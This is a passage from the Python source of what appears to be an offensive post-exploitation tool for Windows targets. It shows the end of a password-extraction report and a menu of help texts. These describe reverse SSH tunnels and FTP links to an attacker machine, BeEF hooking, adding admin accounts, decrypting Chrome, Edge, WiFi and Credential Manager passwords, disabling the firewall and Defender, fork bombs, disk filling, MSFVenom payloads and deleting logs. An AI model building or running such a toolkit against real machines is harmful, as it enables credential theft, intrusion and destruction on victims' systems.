			f.write("\n" + "="*70 + "\n")
			f.write("END OF REPORT\n")
			f.write("="*70 + "\n")
		
		# FINAL OUTPUT
		print(Fore.GREEN + f"[+] Extraction complete!")
		print(Fore.GREEN + f"[+] Total items found: {total_passwords}")
		print(Fore.GREEN + f"[+] JSON file: {json_file}")
		print(Fore.GREEN + f"[+] Summary file: {summary_file}")
		print(Fore.CYAN + "\n[*] Categories extracted:")
		
		for category in all_results["extractions"].keys():
			count = all_results["extractions"][category].get("count", "N/A")
			print(Fore.WHITE + f"  • {category}: {count}")
		
		
		input(Fore.CYAN + "\nPress Enter to continue...")
		cls()

	elif action == "exit":
		logging.info(f"Chosen action exit to exit the program")
		print("Exiting the program...")
		sleep(3)
		exit()

	# ========== INFO COMMANDS ==========
#INFOS!
	
	elif action == "info result":
		print("result) Print current machine scan outcome (only usable after action 'scan'), usable for seeing scan results without having to rescan the machine") 
		sleep(0.1) 
		print("")
		sleep(0.1)
		input("Press Enter to continue...")
		cls()

	elif action == "info scan":
		print("scan) Scans this machine: OS, network name, machine type, platform info, local IP address, stores the scan results in " \
		"scan_results.json file") 
		sleep(0.1) 
		print("")
		sleep(0.1)
		input("Press Enter to continue...") 
		cls()

	elif action == "info hook":
		print("hook) Attempt to hook this machine via BeEF: requires BeEF running on attacker machine, opens the hook URL in default browser") 
		sleep(0.1) 
		print("")
		sleep(0.1)
		input("Press Enter to continue...")
		cls()

	elif action == "info ssh":
		print("ssh) Attempt a local SSH connection: requires openSSH installed and configured, also requires listener script running on attacker machine, sets up a reverse SSH tunnel to attacker machine") 
		sleep(0.1) 
		print("")
		sleep(0.1)
		input("Press Enter to continue...")
		cls()

	elif action == "info ftp":
		print("ftp) Attempt a FTP connection: requires FTP server running on attacker machine, opens an FTP connection to attacker machine") 
		sleep(0.1) 
		print("")
		sleep(0.1)
		input("Press Enter to continue...")
		cls()

	elif action == "info ping":
		print("ping) Check IP connectivity and response: pings target/attacker IP to check connectivity and response time") 
		sleep(0.1) 
		print("")
		sleep(0.1)
		input("Press Enter to continue...")
		cls()

	elif action == "info DiskFill" or action == "info diskfill":
		print("DiskFill) Run diskfiller to fill up disk space: runs diskfiller.bat to fill up disk space on target machine") 
		sleep(0.1) 
		print("")
		sleep(0.1)
		input("Press Enter to continue...")
		cls()

	elif action == "info DiskHost" or action == "info diskhost":
		print("DiskHost) Localy host a disk of the target machine: hosts current folder via python http server on port 8100") 
		sleep(0.1) 
		print("")
		sleep(0.1)
		input("Press Enter to continue...")
		cls()

	elif action == "info AddAdmin" or action == "info addadmin":
		print("AddAdmin) Generate a new admin account on target machine: creates a new user and adds it to local administrators group") 
		sleep(0.1) 
		print("")
		sleep(0.1)
		input("Press Enter to continue...")
		cls()

	elif action == "info PassExport" or action == "info passexport":
		print("PassExport) Export browser saved passwords (Chrome only): retrieves and decrypts saved passwords from Chrome browser, saves results to chrome_passwords.json") 
		sleep(0.1) 
		print("")
		sleep(0.1)
		input("Press Enter to continue...")
		cls()

	elif action == "info ForkBomb" or action == "info forkbomb":
		print("ForkBomb) Attempt a forkbomb on current machine: creates and runs a batch file that continuously spawns new instances of itself, potentially crashing the system") 
		sleep(0.1) 
		print("")
		sleep(0.1)
		input("Press Enter to continue...")
		cls()

	elif action == "info PortOpener" or action == "info portopener":
		print("PortOpener) Open ports in firewall: disables Windows Firewall and Windows Defender real-time protection, deletes all existing firewall rules") 
		sleep(0.1) 
		print("")
		sleep(0.1)
		input("Press Enter to continue...")
		cls()
	
	elif action == "info PacketCapture" or action == "info packetcapture":
		print("PacketCapture) Capture packets on target machine: uses Wireshark's dumpcap to capture network packets on a specified interface and save them to a pcapng file") 
		sleep(0.1) 
		print("")   
		sleep(0.1)
		input("Press Enter to continue...")
		cls()

	elif action == "info Venom" or action == "info venom":
		print("Venom) Run a Venom payload: allows the execution of an .exe file which was generated using MSFVenom and saved into VenomPayload using attackersetup.sh") 
		sleep(0.1) 
		print("")
		sleep(0.1)
		input("Press Enter to continue...")
		cls()

	elif action == "info DeleteLog" or action == "info deletelog":
		print("LogDelete) Delete the program log file: removes the logger.log file created by the program to store logs") 
		sleep(0.1) 
		print("")
		sleep(0.1)
		input("Press Enter to continue...")
		cls()

	elif action == "info WifiCrack" or action == "info wificrack":
		print("WifiCrack) Extract WiFi passwords: retrieves saved WiFi profiles and their passwords from the system, saves results to a JSON file") 
		sleep(0.1) 
		print("")
		sleep(0.1)
		input("Press Enter to continue...")
		cls()

	elif action == "info NetScan" or action == "info netscan":
		print("NetScan) Extract network passwords: retrieves stored network credentials from Windows Credential Manager and mapped network drives, saves results to a text file") 
		sleep(0.1) 
		print("")
		sleep(0.1)
		input("Press Enter to continue...")
		cls()

	elif action == "info AllPass" or action == "info allpass":
		print("AllPass) Extract ALL passwords: performs a comprehensive extraction of saved passwords from multiple sources including Chrome, Edge, WiFi, Windows Credential Manager, and Firefox (encrypted), saves results to a JSON file and a summary text file") 
		sleep(0.1) 
		print("")
		sleep(0.1)
		input("Press Enter to continue...")
		cls()

	elif action == "info help":
		print("help) Show available actions and their descriptions: displays a list of all available commands and brief explanations of what each action does") 
		sleep(0.1) 
		print("")
		sleep(0.1)
		input("Press Enter to continue...")
		cls()

	else:
		print("Invalid action, please choose a valid command or select 'help' to see available actions.")
		sleep(0.1)
		input("Press Enter to continue...")
		cls()
